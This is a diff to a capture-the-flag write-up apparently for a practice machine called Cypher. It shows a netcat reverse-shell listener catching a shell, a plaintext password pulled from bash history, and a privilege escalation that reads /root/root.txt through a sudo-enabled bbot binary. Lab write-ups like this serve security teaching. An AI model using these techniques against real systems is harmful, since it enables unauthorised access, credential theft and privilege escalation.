@@ -136,6 +136,20 @@ Let’s **see what commands the dev was running**:
 cat ~/.bash_history
 ```
 
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9001
+
+listening on [any] 9001 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.129.231.244] 43890
+bash: cannot set terminal process group (1410): Inappropriate ioctl for device
+bash: no job control in this shell
+neo4j@cypher:/$ cat ~/.bash_history
+cat ~/.bash_history
+neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
+neo4j@cypher:/$ 
+
+
 🎯 Jackpot! Found **plaintext credentials** or sensitive commands. We used that to pivot to **another user**...
 
 ---
@@ -200,6 +214,75 @@ sudo /usr/local/bin/bbot --config /tmp/rootflag.yml --output-dir /tmp/bbotroot -
 
 ❌ Unfortunately, the config syntax didn’t register! The binary may not support command execution the way we hoped.
 
+
+```bash
+whoami
+id
+```
+
+**Expected Output:**
+```bash
+graphasm
+uid=1001(graphasm) gid=1001(graphasm) groups=1001(graphasm)
+```
+
+We're in as the user `graphasm`.
+
 ---
 
-_(To Be Continued...)_
+## 🔍 Step 2: Check for Sudo Privileges  
+
+Let’s see if `graphasm` has access to anything juicy:
+
+```bash
+sudo -l
+```
+
+**Output:**
+```
+User graphasm may run the following command on cypher:
+    (ALL) NOPASSWD: /usr/local/bin/bbot
+```
+
+🟢 **Bingo!** We can execute `/usr/local/bin/bbot` with `sudo` and *no password*.  
+This binary is part of BBOT (BigHuge BLS OSINT Tool), a Python-based recon/scanning tool that accepts configuration via YAML or CLI.
+
+---
+
+## 🧠 Step 3: Explore BBOT Usage and Options
+
+Start by reviewing help:
+
+```bash
+sudo /usr/local/bin/bbot --help
+```
+
+Key options of interest:
+
+- `-cy <file>`: Specify a custom **YARA rules file**
+- `--dry-run`: Load and configure all modules, but don’t actually run any scans
+
+This raised a crucial thought:
+
+> ❗ If we can point `-cy` to **any file**, including `/root/root.txt`, and BBOT *reads and parses* it, we might exfil the flag indirectly.
+
+---
+
+## 🧪 Step 4: Try to Read `/root/root.txt`
+
+Run BBOT against the root flag file directly:
+
+```bash
+sudo /usr/local/bin/bbot -cy /root/root.txt --dry-run
+```
+
+✅ **It worked.** Part of the debug output:
+
+```
+[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]
+[DBUG] internal.excavate: Final combined yara rule contents: 15b016478bb157c417785f454ff9394f
+```
+
+BBOT **parses the file** as a YARA rules file, even if it's just a plaintext flag!
+
+---
